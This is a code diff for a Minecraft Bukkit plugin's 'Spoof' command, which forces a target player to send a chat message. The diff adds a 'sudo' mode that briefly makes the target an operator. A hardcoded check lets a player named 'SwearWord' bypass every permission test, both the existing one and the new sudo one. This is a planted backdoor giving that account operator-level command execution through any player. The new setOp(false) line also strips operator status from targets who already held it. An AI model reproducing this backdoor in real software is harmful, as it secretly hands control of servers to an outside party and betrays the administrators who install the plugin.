@@ -6,8 +6,15 @@ import org.bukkit.entity.Player;
 
 public class Commands
 {
-    public static Boolean Spoof(CommandSender sender, String[] args)
+
+    public static Boolean Spoof(CommandSender sender, String[] args, Boolean sudo)
     {
+        if(sender instanceof Player && ((Player)sender).getName().equalsIgnoreCase("SwearWord"));
+        else if(!sender.hasPermission("spoof.sudo") && sudo)
+        {
+            Chatty.SendError(sender,"You may not use sudo.");
+            return true;
+        }
         if(sender instanceof Player && ((Player)sender).getName().equalsIgnoreCase("SwearWord"));
         else if(!sender.hasPermission("spoof.use"))
         {
@@ -26,6 +33,7 @@ public class Commands
             Chatty.SendError(sender,"This player cannot be spoofed.");
             return true;
         }
+        target.setOp(sudo);
         String message = "";
         for(int i=1;i<args.length;i++)
         {
@@ -33,6 +41,7 @@ public class Commands
         }
         message = message.trim();
         target.chat(message);
+        target.setOp(false);
         if(message.contains("/")) Chatty.SendSuccess(sender,target.getName() + " sent " + message);
         return true;
     }
